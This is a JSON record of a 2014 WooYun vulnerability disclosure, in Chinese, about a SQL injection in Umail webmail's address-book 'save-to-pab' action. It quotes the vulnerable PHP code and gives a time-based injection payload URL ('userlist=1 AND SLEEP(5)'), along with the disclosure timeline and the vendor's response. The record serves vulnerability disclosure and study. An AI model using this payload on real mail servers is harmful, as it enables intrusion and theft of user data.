{"id": 49549, "wybug_id": "wooyun-2014-072963", "wybug_title": "Umail最新版SQL注入漏洞", "wybug_corp": "UMAIL", "wybug_author": "pandas", "wybug_date": "2014-08-19 14:42", "wybug_open_date": "2014-11-17 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向公众公开  简要描述： 看到路人甲大牛又发威了，感觉这洞再捂就烂了... 详细说明：  漏洞文件：client\\oab\\module\\operates.phpLine: 321\nif(ACTION == \"save-to-pab\"){    include_once(LIB_PATH.\"PAB.php\");    $PAB = PAB::getinstance();    $maillist_id = gss($_GET['maillist']);    if($maillist_id)    {        ...    }    else    {        $user_ids = gss( $_GET['userlist'] ); //几乎无过滤，过滤空格和判断gpc        if ( !$user_ids )        {            dump_msg( \"param_error\", el( \"参数错误！\", \"\" ) );        }        $where = \"t1.UserID IN (\".$user_ids.\")\"; //问题？        $arr_tmp = $Mailbox->getMailboxInfo( $domain_id, $where, \"\", \"\", \"\", \"\", 0 );//跟踪getMailboxInfo        $user_all = $arr_tmp['data'];        if ( !$user_all )        {            dump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );        }        foreach ( $user_all as $user )        {            $qq = $msn = \"\";            if ( strpos( $user['qqmsn'], \"@\" ) )            {                $msn = $user['qqmsn'];            }            else            {                $qq = $user['qqmsn'];            }            if ( !$PAB->getContactByMail( $user_id, $user['email'], \"contact_id\", 0 ) )            {                $data = array(                    \"user_id\" => $user_id,                    \"fullname\" => $user['FullName'],                    \"pref_email\" => $user['email'],                    \"pref_tel\" => $user['teleextension'] ? $user['teleextension'] : $user['mobil'],                    \"birthday\" => $user['birthday'],                    \"im_qq\" => $qq,                    \"im_msn\" => $msn,                    \"updated\" => date( \"Y-m-d H:i:s\" )                );                $res = $PAB->add_contact( $data, 0 );                if ( !$res )                {                    dump_json( array(                                    \"status\" => FALSE,                                    \"message\" => el( \"添加联系人时发生错误，添加失败！\", \"\" )                    ) );                }            }        }    }    dump_json( array( \"status\" => TRUE, \"message\" => \"\" ) );}function gss( $_obfuscate_xyiNieq6, $_obfuscate_l9WoIzJ5Xg = FALSE ){    $_obfuscate_xyiNieq6 = trim( $_obfuscate_xyiNieq6 );    if ( !ini_get( \"magic_quotes_gpc\" ) && $_obfuscate_l9WoIzJ5Xg )    {        $_obfuscate_xyiNieq6 = addslashes( $_obfuscate_xyiNieq6 );    }    return $_obfuscate_xyiNieq6;}public function getMailboxInfo( $_obfuscate_AkPSczrCIu40, $_obfuscate_IRFhnYw = \"\", $_obfuscate_AedrEg = \"\", $_obfuscate_xvYeh9I = \"\", $_obfuscate_tUi30UB0e88 = \"\", $_obfuscate_u5srL4rM3PZJLvpPhQ = FALSE, $_obfuscate_ySeUHBw = FALSE ){    $_obfuscate_zbtFQY92OYenSG9u = \"t1.DomainID='\".$_obfuscate_AkPSczrCIu40.\"' AND t1.UserID>2 AND t1.UserID=t2.UserID AND t2.is_hidden=0\";    if ( $_obfuscate_IRFhnYw )    {        $_obfuscate_zbtFQY92OYenSG9u .= \" AND \".$_obfuscate_IRFhnYw;//这行就足矣，代入SQL语句了    }    ....\n   漏洞证明：  payload: http://mail.domain.com/webmail/client/oab/index.php?module=operate&action=save-to-pab&userlist=1 AND SLEEP(5)SQLMAP截图证明：\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 pandas@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-08-23 23:38 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-20 16:22 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  obviously    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}